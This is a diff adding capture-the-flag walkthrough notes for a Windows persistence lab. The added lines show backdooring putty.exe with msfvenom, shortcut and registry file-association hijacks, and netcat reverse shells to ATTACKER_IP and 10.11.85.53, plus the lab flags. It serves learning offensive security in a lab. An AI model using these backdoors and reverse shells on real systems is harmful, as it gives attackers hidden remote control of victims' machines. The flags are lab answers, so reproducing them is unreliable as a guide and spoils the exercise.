@@ -39,9 +39,31 @@ Notice that the RID is stored in little endian. The hexadecimal for 500 is 0x1F4
 
 ### Backdooring Files
 - Insert flag5 here <br />
+You can easily plant a payload of your preference in any .exe file with msfvenom. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:
+
+            msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+Another way is to change the shortcut file of a .exe in the desktop to point to a script of our own. et's create a simple Powershell script in C:\Windows\System32. The script will execute a reverse shell and then run calc.exe: 
+
+            Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+            
+            C:\Windows\System32\calc.exe
+The final target for the shortcut is: `powershell.exe -WindowStyle hidden C:\Windows\System32\scirpt.ps1`. `-windowstyle hidden` is important because it won't open a powershell window, which might look a bit sus. 
+So change the shortcut, open a netcat listener, and run the calculator. Get the flag:<br />
+![image](https://github.com/user-attachments/assets/9a7f08a4-cd60-49cb-95c0-d72e83b2465b)<br />
+`THM{NO_SHORTCUTS_IN_LIFE}`
 
 By the way, WHERE THE HELL IS FLAG 4!?
-- Insert flag6 here
+- Insert flag6 here<br />
+First, let's create a ps1 script with the following content and save it to C:\Windows\backdoor2.ps1
+
+            Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.11.85.53 4448"
+            C:\Windows\system32\NOTEPAD.EXE $args[0]
+
+Now let's change the registry key to run our backdoor script in a hidden window. Move to HKLM\Software\Classes\shell\open\command and edit it: <br />
+![image](https://github.com/user-attachments/assets/baa53c54-d822-4755-aa35-31b2d3bbe472)<br />
+Finally get the flag: <br />
+![image](https://github.com/user-attachments/assets/909c44cc-eff8-41ad-9411-cf8c3bb38762)<br />
+`THM{TXT_FILES_WOULD_NEVER_HURT_YOU}`
 
 ### Abusing Services
 - Insert flag7 here
